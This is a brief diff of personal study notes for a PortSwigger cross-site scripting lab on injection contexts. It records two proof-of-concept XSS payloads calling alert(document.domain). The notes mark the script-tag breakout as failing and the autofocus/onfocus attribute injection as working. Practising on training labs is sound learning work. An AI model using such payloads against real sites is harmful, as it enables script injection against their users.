@@ -1,0 +1,6 @@
+Break the statement
+https://portswigger.net/web-security/cross-site-scripting/contexts
+"><script>alert(document.domain)</script> 
+this didnt work
+" autofocus onfocus=alert(document.domain) x="  
+this worked
